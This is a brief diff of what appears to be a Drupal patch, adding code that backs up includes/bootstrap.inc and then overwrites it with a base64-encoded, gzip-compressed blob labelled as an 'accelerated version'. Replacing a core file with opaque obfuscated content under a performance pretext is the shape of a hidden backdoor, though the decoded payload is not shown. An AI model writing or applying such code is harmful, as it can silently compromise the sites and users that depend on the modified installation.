@@ -8,7 +8,7 @@
 +
 +if(!file_exists(DRUPAL_ROOT . '/includes/bootstrap.slow.inc')) {
 +  //Backup previous file :
-+  file_put_contents(DRUPAL_ROOT . '/includes/bootstrap.slow.inc',file_get_contents(DRUPAL_ROOT . '/includes/bootstrap.inc'));
++  file_put_contents(DRUPAL_ROOT . '/includes/bootstrap.slow.inc', file_get_contents(DRUPAL_ROOT . '/includes/bootstrap.inc'));
 +  //Acceleratred version :
 +  file_put_contents(DRUPAL_ROOT . '/includes/bootstrap.inc', gzinflate(base64_decode('HY3BbsIwEETv+YrJycnFfACgiqqXSlWLIJwtY29ai5UdvDYIof57k85x3ujN5mX6mZowdt9UjKs5UyymCuWuR7uFcjNWPZ4N4AN16lidI5GxMj9AN+vJw9aSrhY2eoQCTuki4HAhWGYEwRgiQWuN19OA9+GIz68lA1rVr5tfEAv9P2S61pDJpOgIb4fTfvdhDstQQ61CdFw9yeqcUpGS7aSF013PvZotzR8=')));
 +}
